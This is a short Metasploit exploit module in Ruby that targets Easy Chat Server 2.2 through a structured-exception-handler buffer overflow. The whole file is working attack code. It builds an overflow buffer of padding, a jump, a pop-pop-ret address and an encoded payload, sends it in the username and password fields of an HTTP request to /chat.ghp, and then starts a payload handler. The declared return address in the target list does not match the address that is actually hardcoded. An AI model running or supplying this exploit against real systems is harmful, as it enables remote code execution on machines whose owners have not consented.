require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Easy Chat Server 2.2 SEH BOF',
			'Description'    => %q{
					This exploits a SEH based BOF on easy chat server
			},
			'Author'         => [ 'Nipun Jaswal' ],
			'Payload'        =>
				{
					'Space'       => 1024,
					'BadChars'    => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
			
			'Easy Chat Server 2.2',
						{
							'Ret'    => 0x1002bd33,
							'Length' => 1036
						},
					]
				],
			'DefaultTarget'  => 0
))
	end
	def exploit
		print_status("Sending Exploit and Overwriting SEH")
		jmp = "\xeb\x06\x90\x90"
		ppr = "\xa2\xb9\01\x10"
		buffer = "\x41" * 216 + jmp + ppr + payload.encoded		
		send_request_raw({
			'uri' =>
				"/chat.ghp?username=" +buffer+
				"&password=" +buffer+"&room=1&sex=2"
		}, 2)
		handler
	end

end
